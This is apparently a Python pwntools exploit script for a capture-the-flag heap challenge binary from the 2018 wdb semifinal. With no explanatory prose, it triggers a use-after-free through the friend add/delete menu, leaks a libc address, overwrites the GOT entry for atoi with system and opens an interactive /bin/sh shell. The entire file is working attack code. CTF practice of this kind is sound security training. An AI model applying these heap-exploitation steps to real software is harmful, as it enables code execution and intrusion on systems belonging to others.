#!/usr/bin/python3
from pwn import *
from pwncli import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/bin/heap23_55_wdb_2018_semifinal_pwn1')
elf = ELF('./data/bin/heap23_55_wdb_2018_semifinal_pwn1')
libc = elf.libc

def register(name_size:int, name:(str, bytes), age:int, desc:(str, bytes)="a"):
    p.sendlineafter("Your choice:", "2")
    p.sendlineafter("Input your name size:", str(name_size))
    p.sendafter("Input your name:", name)
    p.sendlineafter("Input your age:", str(age))
    if age > 17:
        p.sendafter("Input your description:", desc)


def login(user_name:(str, bytes)):
    p.sendlineafter("Your choice:", "1")
    p.sendafter("Please input your user name:", user_name)
    msg = p.recvline()
    info("Msg recv: {}".format(msg))
    return msg


def view_profile():
    p.sendlineafter("Your choice:", "1")
    msg = p.recvlines(3)
    info("Msg recv: {}".format(msg))
    return msg


def update_profile(user_name:(str, bytes), age:int, desc:(str, bytes)):
    p.sendlineafter("Your choice:", "2")
    p.sendafter("Input your name:", user_name)
    p.sendlineafter("Input your age:", str(age))
    p.sendafter("Input your description:", desc)


def add_delete_friend(add_delete:str, friend_name:(str, bytes)):
    p.sendlineafter("Your choice:", "3")
    p.sendafter("Input the friend's name:", friend_name)
    p.sendlineafter("So..Do u want to add or delete this friend?(a/d)", add_delete)


def send_message(friend_name:(str, bytes), title:(str, bytes), content:(str, bytes)):
    p.sendlineafter("Your choice:", "4")
    p.sendafter("Which user do you want to send a msg to:", friend_name)
    p.sendafter("Input your message title:", title)
    p.sendafter("Input your content:", content)


def view_message():
    p.sendlineafter("Your choice:", "5")
    msg = p.recvuntil("1.view profile\n")
    info("Msg recv: {}".format(msg))
    return msg

def logout():
    p.sendlineafter("Your choice:", "6")


register(0x10, "user1", 16)
register(0x10, "user2", 16)


login("user1\x00")
add_delete_friend('a', "user2\x00")

add_delete_friend('d', "user2\x00")

logout()
register(0x128, p64(0x401816), 16)

# stop()
login("Done!" + "\x00")
_, leak_addr, _1 = view_profile()

libc_base_addr = int16(leak_addr[4:].decode()) - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

logout()

login(p64(0x401816))
update_profile(p64(0x602060), 123, "deadbeef")
logout()

login(p64(libc_base_addr + libc.sym['atoi']))

p.sendlineafter("Your choice:", "2")
p.sendafter("Input your name:", p64(libc_base_addr + libc.sym['system']))
p.sendafter("Input your description:", "/bin/sh\x00")
p.sendline("/bin/sh\x00")

p.interactive()